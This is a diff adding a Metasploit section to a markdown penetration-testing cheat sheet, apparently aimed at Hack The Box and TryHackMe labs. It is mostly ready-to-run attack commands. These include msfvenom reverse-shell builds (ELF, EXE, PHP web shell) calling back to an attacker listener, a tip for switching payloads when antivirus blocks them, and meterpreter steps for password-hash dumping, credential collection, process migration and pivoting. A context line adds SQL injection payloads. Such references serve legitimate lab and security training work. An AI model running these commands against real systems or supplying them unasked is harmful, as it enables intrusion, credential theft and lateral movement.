@@ -111,3 +111,37 @@ GTFOBins / LOLBAS as canonical external references.
 - **Deserialization** → ysoserial (Java), pickle (Python), node-serialize (Node).
 - **SQLi** → `sqlmap -u <url> --batch --risk=2 --level=3`. Manual: `' OR 1=1--`, time-based for blind.
 - **File upload** → bypass extension filters, content-type, magic bytes; race conditions on validators.
+
+## Frameworks
+
+### Metasploit
+- Launch: `msfconsole -q`. Enable DB: `db_status` should show `connected`. Set workspace per target: `workspace -a <target>`.
+- Import scans: `db_nmap -sC -sV <ip>` (runs nmap and ingests results), then `hosts`, `services`, `vulns` to inspect.
+- Search: `search <product|cve|name>` (e.g., `search type:exploit name:vsftpd`, `search cve:2021-41773`). `info <module>` for details.
+- Use module: `use <module-path>` → `show options` → `set RHOSTS <ip>` → `set LHOST tun0` → `set LPORT 4444` → `check` (when supported) → `run` / `exploit`.
+- **Discovery / aux scanners** (safe-ish, run before exploitation):
+  - SMB: `auxiliary/scanner/smb/smb_version`, `smb_enumshares`, `smb_enumusers`, `smb_login` (creds only — confirm first).
+  - HTTP: `auxiliary/scanner/http/http_version`, `http_header`, `dir_scanner`, `robots_txt`, `wordpress_scanner`.
+  - FTP: `auxiliary/scanner/ftp/anonymous`, `ftp_version`.
+  - SSH: `auxiliary/scanner/ssh/ssh_version` (auth scans → confirm first).
+  - SNMP: `auxiliary/scanner/snmp/snmp_enum`, `snmp_login`.
+  - SMTP/POP3/IMAP: `auxiliary/scanner/<svc>/<svc>_version`, `*_enum`.
+  - RDP: `auxiliary/scanner/rdp/rdp_scanner`, `auxiliary/scanner/rdp/cve_2019_0708_bluekeep`.
+- **Payloads:** prefer `meterpreter/reverse_tcp` (Linux: `linux/x64/meterpreter/reverse_tcp`, Windows: `windows/x64/meterpreter/reverse_tcp`). Stageless variant: `_reverse_tcp` → `_reverse_tcp_stageless` when AV blocks staged. CMD-only target: `cmd/unix/reverse` or `cmd/windows/reverse_powershell`.
+- **Handlers:** `use exploit/multi/handler`, `set PAYLOAD <same-as-implant>`, `set LHOST tun0`, `set LPORT 4444`, `run -j` to background. `sessions -l` to list, `sessions -i <n>` to interact.
+- **msfvenom (out-of-band payloads):**
+  - Linux ELF: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf`.
+  - Windows EXE: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o s.exe`.
+  - Web shells: `-p php/meterpreter_reverse_tcp -f raw -o shell.php`; ASPX, JSP, war variants.
+  - List options: `msfvenom --list payloads | grep <pattern>`.
+- **Post-exploitation (meterpreter session):**
+  - `sysinfo`, `getuid`, `getsystem` (try privesc).
+  - `run post/multi/recon/local_exploit_suggester` — ranked privesc suggestions.
+  - `run post/windows/gather/hashdump`, `run post/windows/gather/credentials/credential_collector`.
+  - `migrate <pid>` to a stable process before pivoting.
+  - Pivot: `run autoroute -s <internal-subnet>/24`, then use `auxiliary/server/socks_proxy` + `proxychains`.
+- **Tips:**
+  - Always set `LHOST` to the VPN interface (`tun0`) on HTB/THM, not your default route.
+  - `setg` globals (LHOST, RHOSTS) once per session to avoid resetting per module.
+  - When a public PoC exists outside MSF, prefer it for learning — MSF hides the mechanics.
+  - `exit -y` cleanly closes; sessions persist if you `background` them.
